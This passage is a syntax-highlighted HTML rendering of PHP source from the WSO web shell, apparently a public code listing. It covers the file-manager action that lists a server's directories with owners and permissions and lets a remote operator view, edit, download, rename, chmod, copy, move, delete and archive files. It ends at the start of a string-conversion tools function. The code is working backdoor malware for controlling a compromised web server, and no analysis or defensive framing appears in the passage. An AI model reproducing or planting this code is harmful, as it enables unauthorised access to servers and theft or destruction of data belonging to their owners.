                    <span class="k">foreach</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$f</span><span class="p">)</span>
                        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span>
                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
                <span class="p">}</span>
                <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nv">$dirContent</span> <span class="o">=</span> <span class="o">@</span><span class="nb">scandir</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]</span><span class="o">:</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$dirContent</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>   <span class="k">echo</span> <span class="s1">&#39;Can\&#39;t open this folder!&#39;</span><span class="p">;</span><span class="nx">wsoFooter</span><span class="p">();</span> <span class="k">return</span><span class="p">;</span> <span class="p">}</span>
    <span class="k">global</span> <span class="nv">$sort</span><span class="p">;</span>
    <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;!s_([A-z]+)_(\d{1})!&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span> <span class="nv">$match</span><span class="p">))</span>
            <span class="nv">$sort</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$match</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="p">}</span>
<span class="k">echo</span> <span class="s2">&quot;&amp;lt;script&amp;gt;</span>
<span class="s2">   function sa() {</span>
<span class="s2">       for(i=0;i&amp;lt;d.files.elements.length;i++)</span>
<span class="s2">           if(d.files.elements[i].type == &#39;checkbox&#39;)</span>
<span class="s2">               d.files.elements[i].checked = d.files.elements[0].checked;</span>
<span class="s2">   }</span>

<span class="s2">&amp;lt;/script&amp;gt;</span>
<span class="s2">&amp;lt;table width=&#39;100%&#39; class=&#39;main&#39; cellspacing=&#39;0&#39; cellpadding=&#39;2&#39;&amp;gt;</span>
<span class="s2">&amp;lt;form name=files method=post&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th width=&#39;13px&#39;&amp;gt;&amp;lt;input type=checkbox onclick=&#39;sa()&#39; class=chkbx&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_name_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;Name&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_size_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;Size&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_modify_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;Modify&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Owner/Group&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;&amp;lt;a href=&#39;#&#39; onclick=&#39;g(</span><span class="se">\&quot;</span><span class="s2">FilesMan</span><span class="se">\&quot;</span><span class="s2">,null,</span><span class="se">\&quot;</span><span class="s2">s_perms_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">)&#39;&amp;gt;Permissions&amp;lt;/a&amp;gt;&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;Actions&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nv">$dirs</span> <span class="o">=</span> <span class="nv">$files</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="nv">$n</span> <span class="o">=</span> <span class="nb">count</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$n</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$ow</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
        <span class="nv">$gr</span> <span class="o">=</span> <span class="o">@</span><span class="nb">posix_getgrgid</span><span class="p">(</span><span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]));</span>
        <span class="nv">$tmp</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span>
                     <span class="s1">&#39;path&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">],</span>
                     <span class="s1">&#39;modify&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">date</span><span class="p">(</span><span class="s1">&#39;Y-m-d H:i:s&#39;</span><span class="p">,</span> <span class="o">@</span><span class="nb">filemtime</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])),</span>
                     <span class="s1">&#39;perms&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nx">wsoPermsColor</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
                     <span class="s1">&#39;size&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
                     <span class="s1">&#39;owner&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$ow</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]),</span>
                     <span class="s1">&#39;group&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">?</span><span class="nv">$gr</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">:@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span>
                    <span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span>
            <span class="nv">$files</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;file&#39;</span><span class="p">));</span>
        <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_link</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]))</span>
            <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;link&#39;</span><span class="p">,</span> <span class="s1">&#39;link&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nb">readlink</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">])));</span>
        <span class="k">elseif</span><span class="p">(</span><span class="o">@</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">])</span><span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$dirContent</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">))</span>
            <span class="nv">$dirs</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;type&#39;</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="s1">&#39;dir&#39;</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$sort</span><span class="p">;</span>
    <span class="k">function</span> <span class="nf">wsoCmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;size&#39;</span><span class="p">)</span>
            <span class="k">return</span> <span class="nb">strcmp</span><span class="p">(</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]]),</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$b</span><span class="p">[</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]]))</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="k">return</span> <span class="p">((</span><span class="nv">$a</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span> <span class="nv">$b</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nb">usort</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="s2">&quot;wsoCmp&quot;</span><span class="p">);</span>
    <span class="nb">usort</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="s2">&quot;wsoCmp&quot;</span><span class="p">);</span>
    <span class="nv">$files</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$dirs</span><span class="p">,</span> <span class="nv">$files</span><span class="p">);</span>
    <span class="nv">$l</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&#39;</span><span class="o">.</span><span class="p">(</span><span class="nv">$l</span><span class="o">?</span><span class="s1">&#39; class=l1&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=checkbox name=&quot;f[]&quot; value=&quot;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&quot; class=chkbx&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=# onclick=&quot;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;view\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">:</span><span class="s1">&#39;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\&#39;);&quot; title=&#39;</span> <span class="o">.</span> <span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&amp;gt;&amp;lt;b&amp;gt;[ &#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39; ]&amp;lt;/b&amp;gt;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="nx">wsoViewSize</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">])</span><span class="o">:</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;modify&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;owner&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;group&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=# onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;,\&#39;chmod\&#39;)&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;perms&#39;</span><span class="p">]</span>
            <span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;rename\&#39;)&quot;&amp;gt;R&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;touch\&#39;)&quot;&amp;gt;T&amp;lt;/a&amp;gt;&#39;</span><span class="o">.</span><span class="p">((</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;file&#39;</span><span class="p">)</span><span class="o">?</span><span class="s1">&#39; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;edit\&#39;)&quot;&amp;gt;E&amp;lt;/a&amp;gt; &amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesTools\&#39;,null,\&#39;&#39;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$f</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;\&#39;, \&#39;download\&#39;)&quot;&amp;gt;D&amp;lt;/a&amp;gt;&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
        <span class="nv">$l</span> <span class="o">=</span> <span class="nv">$l</span><span class="o">?</span><span class="mi">0</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td colspan=7&amp;gt;</span>

<span class="s2">   &amp;lt;input type=hidden name=a value=&#39;FilesMan&#39;&amp;gt;</span>
<span class="s2">   &amp;lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span>
<span class="s2">   &amp;lt;input type=hidden name=charset value=&#39;&quot;</span><span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span>
<span class="s2">   &amp;lt;select name=&#39;p1&#39;&amp;gt;&amp;lt;option value=&#39;copy&#39;&amp;gt;Copy&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;move&#39;&amp;gt;Move&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;delete&#39;&amp;gt;Delete&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;ZipArchive&#39;</span><span class="p">))</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=&#39;zip&#39;&amp;gt;Compress (zip)&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;unzip&#39;&amp;gt;Uncompress (zip)&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=&#39;tar&#39;&amp;gt;Compress (tar.gz)&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span>
        <span class="k">echo</span> <span class="s2">&quot;&amp;lt;option value=&#39;paste&#39;&amp;gt;Paste / Compress&amp;lt;/option&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/select&amp;gt;&amp;nbsp;&quot;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nb">count</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;zip&#39;</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;tar&#39;</span><span class="p">)))</span>
        <span class="k">echo</span> <span class="s2">&quot;file name: &amp;lt;input type=text name=p2 value=&#39;wso_&quot;</span> <span class="o">.</span> <span class="nb">date</span><span class="p">(</span><span class="s2">&quot;Ymd_His&quot;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;.&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;zip&#39;</span><span class="o">?</span><span class="s1">&#39;zip&#39;</span><span class="o">:</span><span class="s1">&#39;tar.gz&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&amp;nbsp;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;input type=&#39;submit&#39; value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;/div&amp;gt;&quot;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionStringTools</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2bin&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2bin</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">decbin</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));}}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;binhex&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">binhex</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">dechex</span><span class="p">(</span><span class="nb">bindec</span><span class="p">(</span><span class="nv">$p</span><span class="p">));}}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;hex2ascii&#39;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">hex2ascii</span><span class="p">(</span><span class="nv">$p</span><span class="p">){</span><span class="nv">$r</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nx">strLen</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span><span class="nv">$i</span><span class="o">+=</span><span class="mi">2</span><span class="p">){</span><span class="nv">$r</span><span class="o">.=</span><span class="nb">chr</span><span class="p">(</span><span class="nb">hexdec</span><span class="p">(</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="nv">$p</span><span class="p">[</span><span class="nv">$i</span><span class="o">+</span><span class="mi">1</span><span class="p">]));}</span><span class="k">return</span> <span class="nv">$r</span><span class="p">;}}</span>
